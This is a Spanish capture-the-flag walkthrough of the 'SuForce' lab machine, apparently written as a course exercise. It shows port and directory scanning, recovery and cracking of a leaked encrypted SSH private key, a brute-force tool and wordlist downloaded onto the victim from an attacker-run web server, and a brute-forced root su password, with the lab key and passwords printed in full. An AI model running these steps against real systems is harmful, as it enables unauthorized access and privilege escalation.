### SuForce
Realiza un análisis completo y elabora 10 preguntas relevantes que aborden aspectos técnicos, metodológicos y estratégicos observados durante el proceso de resolución

Empezamos por escaneo basico con nmap 
```
nmap -sVC -A <IP-MAQUINA> -p-

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15

```
Tenemos abiertos los puertos 22 y 80, revisamos desde el navegador 

```
http://<IP-MAQUINA>:80

```
Solo aparece la pagina principal de Apache, vamos a escanear los directorios con gobuster

```
gobuster dir -u http://10.10.230.142 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt /index.html           (Status: 200) [Size: 10701]
/index.html           (Status: 200) [Size: 10701]
/notes.txt            (Status: 200) [Size: 101]

```
Vamos abrir el archivo notes.txt

```
http://<IP-MAQUINA>/notes.txt
Fuck!

configuring SSH, I closed the editor by mistake and lost the key.. I can't find it

Diego

```
Ahora sabemos que es un usuario Diego que a la hora de configuracion de SSH se ha perdido su clave, vamos a buscar mas archivos .bin, .swp con gobuster

```
gobuster dir -u http://10.10.191.37 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,save,swp -t 40

/id_rsa.swp           (Status: 200) [Size: 1743]
/index.html           (Status: 200) [Size: 10701]
/notes.txt            (Status: 200) [Size: 101]

```
Ya tenemos el archivo id_rsa.swp con la clave de acceso. Abrimos este archivo en navegador y copiamos en un archivo id_rsa.key

```
sudo nano id_rsa.key 

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,5FB6DAB10833FB47

wyx0cnQnbD8irngLK6O52ClihBJPTKpjbQdqfB/AbIlyBCtm0AAib5Ej6VH9UMKy
FEFFemgiN2Wpxz3vPq6RI470BL+2BXbqhO3yNGwCkmHiStWQ8AlhXdh+z5cP8xoT
/3wTzXQsCMT2sCwvOs2QoKXTEzd8RF6SqjD2ambSkzZMCoo+dYHw4+2PnbUiXr3s
VSJsNxiouNu9uUT+MpvKyfvpW1jfE/lcyEYWHFhllIjyLYqmZDEumhfMu3Q2ji7c
XjAuzgapP11+uSnzFLQo8DrSdmhmYJV+xYpKBiQLAZcsiwTzuyYz0CQhpVa7z9P6
rob+yzlwG/7erGjDb6wg/UJwDcjPn+T9mPrU0fZDF13iJNG9sE0OG80hd6QwPiFJ
mlW++fLEtYTC+wv56QiGPlDZn4yDziABRnRxYjHJnPvxZjpZFq+1hMc6OEyIst02
fN/C0Q6oZtYdLleb15/jhlX1gKH70L8a8ecmgmmYaS31kMdHwZinU8wHl4Pcrf88
We71WkrkFkuPlF2afLDehYSlJxeT2cJ+H9lGkEsfGL4JtoT4uyjsREiqC0Q3BlsD
7fA4t4k7quxq9q6A5YJQc8pDKWO6f/poDTBHxeK4Urzwh4gMjLWxuImTpvG3mydp
Z8FdMgO/AyWa7Zq8DACEZoDxY6IWwwJ2vcaSremVBlA2vkQqZsG1Df2wDlfF+/P0
PMUNDDshRx92IHnzinM+AM3HilxDKV1vwjMjOJJH1blb1sNIHUT85P90Ewn5NEgE
ACl3fK/GkOU9KX0gGfkXwmWqrFkeliTEhGpi7s9j5YSvbq4fTszxqt8UuM/gdTUf
7GPJCOe/h3oudznytN6j2N6Z15SOGG2j8+xUfgAbW/+IxuCdpVqGWESkTJ7VfbxR
sKq3U1AUm+fLrQ6T9+NIzHRuqts9EXUMkXjoDIsY56ZYU04oOezuvDzgy/GxVNeC
eLDEo8/IY77HjoQxP3a+AfEyFH26x4JVgF43RXSqdyGL62IqAjmdNnRM91XZJUY7
nNsnTyYDmQaAZLY2KQfiYQkUV4q6sGVmcwzM+ryTAIQJlmYbo+OCKZgg4ZxOjofM
axd1DhxHbC/Y2CdkB60N9fJdQSKqYjGPK7dDI/JBevrphp+p6ZMDeP8oERryI8mX
aLdVMWV3VcvR6Vs/x2/ogI6EBn1CA2VOooTtV77zKRHDcDlU2HmiOSRNCXvwLDi0
qPLJRBwSE+wwMgDAKsU+Yv5itHq7pCkeqzMbvD6E5kFyvHhXi2YmYj4EYPiz8OYP
dyw7aG8b8tICRoYRN3FjFH5kh1/PXWOf1TlbdHmYE6vNgpoBmrNNfEzT6zeZxKXj
ExJHVZ3v9+7rhPXUZasONogZrm9w9fOPSMFrVdNZsrZsrWAukfG+wCKVdzy5vAvL
bHefHgEM5ZC8v4+Kg7nsFjM6DHWn5y+lFb15TYptWApZ7+2UWHGhu3a1lZvxSFGi
iwEjHBlsCo8IBsRIRKrae6RpuQhVlm1fRZqf0yFuv2W2KjUGMqCinxn/7o7rY/d3
l5Ziei4zwDkhZTWB+iZtaJ7aSUJ6CKJb5sTta7HqSSgutGAX80Ao3g==
-----END RSA PRIVATE KEY-----

```
Desciframos la llave con ssh2John en un archivo clave.hash

```
ssh2john id_rsa.key > clave.hash 

```
Hacemos la fuerza bruta con JohnTheRipper para saber la contraseña

```
john --wordlist=/usr/share/wordlists/rockyou.txt clave.hash 
sandiego         (id_rsa.key) 

```
Ahora podemos entrar con el usuario Diego y su clave id_rsa y la la contraseña

```
ssh -i id_rsa.key diego@10.10.136.20
Enter passphrase for key 'id_rsa.key': 
Linux suforce 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Mon May 22 13:56:42 2023 from 192.168.1.10

```
Encontramos un archivo user.txt en el directorio del usuario con la primera flag

```
diego@suforce:~$  ls -la

-r-------- 1 diego diego   22 may 20 00:01 user.txt

cat user.txt
FLAG://U53R_D13G0.GCF

```
Ahora vamos a escalar privilegios. Vamos a utilizar una herramienta suForce para hacer la fuerza bruta para reconocer la contraseña de root. Descargamos la herramienta con wget 'https://drive.usercontent.google.com/uc?id=1DQZXdvk6mgJt1H2up-AjhW-Rmu8Pfl-p&export=download' -O suForce.zip.
Abrimos el archivo con unzip y ahora vamos a descargar un archivo suForce.sh a la maquina victima. Esto se puede hacer de varias maneras con wget o con scp. Vamos a activar el servidor http en la maquina kali y con wget descragar primero el wordlist/rockyou.txt, porque lo vamos a utilizar para la fuerza bruta y despues descargamos suForce.sh

```
┌──(kali㉿kali)-[/usr/share/wordlists]
python3 -m http.server 8888 
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...

diego@suforce:~$ wget http://10.23.75.205:8888/rockyou.txt
Grabando a: «rockyou.txt»

rockyou.txt                 100%[===========================================>] 133,44M  6,48MB/s    en 21s 

┌──(kali㉿kali)-[~/Desktop/Eval_Cont]
└─$ python3 -m http.server 8888 
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) 

diego@suforce:~$ wget http://10.23.75.205:8888/suForce.sh
Grabando a: «suForce.sh»

suForce.sh                  100%[===========================================>]   2,89K  --.-KB/s    en 0,002s

```
Cambiamos los permisos para poder ejecutar y lanzamos la fuerza bruta

```

chmod +x suForce.sh

./suForce.sh -u root -w rockyou.txt
==========================================================
███████╗██╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔════╝██║   ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
███████╗██║   ██║█████╗  ██║   ██║██████╔╝██║     █████╗ 
╚════██║██║   ██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝ 
███████║╚██████╔╝██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
==========================================================
 Dev: SuForce     Version: v0.0.1
==========================================================
Username | root
Wordlist | rockyou.txt
 Status   | 3267/14344392/0%/rootbeer
 Pass | rootbeer
==========================================================

```
Ya tenemos la contaseña de root. Con su - y su contraseña accedemos a root y en su directorio encontramos el archivo con la flag

```

diego@suforce:~$ su -
Contraseña: 
root@suforce:~# ls -la
total 28
drwx------  3 root root 4096 may 20 00:00 .
drwxr-xr-x 18 root root 4096 may 22  2023 ..
lrwxrwxrwx  1 root root    9 may 22  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 ene 15  2023 .bashrc
drwxr-xr-x  3 root root 4096 ene 15  2023 .local
-rw-r--r--  1 root root  161 jul  9  2019 .profile
-r--------  1 root root   26 may 20 00:00 root.txt
-rw-r--r--  1 root root   66 may 22  2023 .selected_editor
root@suforce:~# cat root.txt
FLAG://G00D_W0RK_R00T.GCF

